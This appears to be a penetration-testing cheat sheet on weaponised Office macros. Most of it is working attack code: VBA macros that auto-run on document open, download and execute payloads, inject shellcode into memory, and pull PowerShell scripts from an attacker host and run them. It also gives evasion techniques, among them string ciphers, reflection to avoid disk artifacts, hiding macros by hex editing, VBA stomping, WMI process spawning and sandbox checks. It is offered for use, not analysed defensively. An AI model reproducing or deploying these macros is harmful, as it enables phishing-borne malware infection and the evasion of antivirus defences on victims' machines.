# Office

### Download File & Execute via Macro

```aspnet
Sub Document_Open()
  DocMacro
End Sub

Sub AutoOpen()
  DocMacro
End Sub

Sub DocMacro()
  Dim str As String
  str = "powershell (New-Object System.Net.WebClient).DownloadFile('url','filename')"
  Shell str, vbHide
  Dim path As String
  path = ActiveDocument.Path + "\filename"
  Wait (3)
  Shell path , vbHide
End Sub

Sub Wait(n As Long)
  Dim t As Date
  t = Now
  Do
    DoEvents
  Loop Until Now >= DateAdd("s", n, t)
```

### Switches text after enabling macros

Save the "after enabling macros" text as a template and use the following function to replace the current contents with the saved ones \(e.g. fake an encrypted documented\):  

```text
Sub SubPage()
  ActiveDocument.Content.Select
  Selection.Delete
  ActiveDocument.AttachedTemplate.AutoTextEntries("Saved").InsertWhere:=Selection.Range, RichText:=True
End Sub
```

### Run Shellcode From Macro via VBA

```text
Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Function DocMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long
    buf = Array(232, 130, 255, 213)
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    For counter = LBound(buf) To UBound(buf)
    data = buf(counter)
    res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function

Sub Document_Open()
    DocMacro
End Sub
Sub AutoOpen()
    DocMacro
End Sub
```

Note that the shell will die when the victim closes word with this variant. Should you want to generate shellcode via msfvenom use the "vbapplication" output \(32-Bit\). Interestingly this does not get caught by defender \(12/2020\).

### Run Shellcode from Macro via PowerShell

Look for useful P/Invoke calls on www.pinvoke.net. Then create a PowerShell script like the following:

```text
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
}
"@
Add-Type $Kernel32

[Byte[]] $buf = 0xfc,...
$size = $buf.Length
[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
$thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);
[Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
```

Then, inside your macro use:

```text
Sub DocMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://<ip>/xct.ps1') | IEX"
    Shell str, vbHide
End Sub

Sub Document_Open()
    DocMacro
End Sub
Sub AutoOpen()
    DocMacro
End Sub
```

Note that this method leaves some artifacts on disk \(Add-Type will write .cs files and compile them into .dlls\), the next snippet prevents this by creating the .NET assembly in memory via reflection.

### Run Shellcode from Macro via PowerShell using Reflection

```text
function LookupFunc {
	Param ($moduleName, $functionName)
	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
	Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	$tmp=@()
	$assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,
	@($moduleName)), $functionName))
}

function getDelegateType {
	Param (
	[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
	[Parameter(Position = 1)] [Type] $delType = [Void]
	)
	$type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate])
	$type.DefineConstructor('RTSpecialName, HideBySig, Public',	[System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
	$type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
	return $type.CreateType()
}
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType ([IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

[Byte[]] $buf = 0xfc, ...
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr],[UInt32], [IntPtr])([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)

```

This variant will leave no artifacts as references to .NET assemblies are resolved dynamically via reflection. Defender will detect it though \(12/2020\).

### Evasion

PowerShell From Macro with substitution cipher \(alphabet is shuffled, encoded using cyberchef\):

```text
Sub Document()
  ActiveDocument.Content.Select
  Selection.Delete
  ActiveDocument.AttachedTemplate.AutoTextEntries("Template").Insert Where:=Selection.Range, RichText:=True
End Sub

Function Privacy(sInput As String) As String
    Dim vaBefore As Variant
    Dim vaAfter As Variant
    Dim i  As Long
    Dim sReturn As String
    sReturn = sInput
    vaAfter = Split("A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z,a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z", ",")
    vaBefore = Split("T,L,E,a,A,O,I,v,K,t,V,F,R,q,C,Z,S,h,s,j,o,X,H,Y,M,f,g,y,r,w,z,G,P,u,n,c,N,i,e,U,B,Q,J,m,d,b,x,D,k,l,W,p", ",")
    For i = LBound(vaBefore) To UBound(vaBefore)
        sReturn = Replace$(sReturn, vaBefore(i), "&" & Asc(vaAfter(i)))
    Next i
    For i = LBound(vaAfter) To UBound(vaAfter)
        sReturn = Replace$(sReturn, "&" & Asc(vaAfter(i)), vaAfter(i))
    Next i
    Privacy = sReturn
End Function

Sub Launch()
    Dim s As String
    s = Privacy("QBkzmduzii -zlzr yWQgdd -UBQ  -knU unwwzU -UBUn -r ""(Uzk-Byczrb dWdbze.Uzb.kzyrinzUb).wBkUiBgwdbmnUP('ubbQ://<ip>/mxU2.blb')|KAY""")
    Debug.Print s
    Shell s, vbHide
End Sub

Sub Document_Open()
    Document
    Launch
End Sub
Sub AutoOpen()
    Document
    Launch
End Sub
```

Alternate way of execution:

```text
Sub Launch()
    Dim str As String
    str = Privacy("""nzl(nkm ubbQ://<ip>mxU2.blb -xdzygdnrQgmdnUP)""")
    Set wshShell = CreateObject("WScript.Shell")
    wshShell.Run ("powershell.exe -ep bypass -c " & str)
End Sub
```



#### Hiding Macros

Using [FlexHex ](http://www.flexhex.com/)we can open Excel/Word Files and hex edit them. Editing "Module=NewMacros" to Null Bytes leads to Office no longer displaying the macros \(but still running them\).

#### VBA Stomping

Macros get compiled into P-Code, which is executed whenever the document is opened on a computer with the exact same version of office. Otherwise the textual version is used. Most AV only analyze the textual version, ignoring the P-Code - therefore we can remove the textual source and evade AV that way \(Edit to zeros in FlexHex\). On first execution of the macro, the P-Code will be decompiled and written back as a textual version.

This can be automated using [EvilClippy](https://github.com/outflanknl/EvilClippy) .

#### Using WMI to break Parent/Child Relationship

Powershell as a child of word is very suspicious, using WMI we can change that:

```text
Sub SomeMacro
    strArg = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://<ip>/script.txt'))"
    GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
End Sub
Sub AutoOpen()
SomeMacro
End Sub
```

#### Obfuscating VBA

We can use custom ciphers on strings in the document \(this is surprisingly effective\).

#### Detect Running in a Sandbox

Some AV Vendors will rename the file on execution, which is easy to check for us:

```text
If ActiveDocument.Name <> Decrypt("...") Then
    Exit Function
End If
```



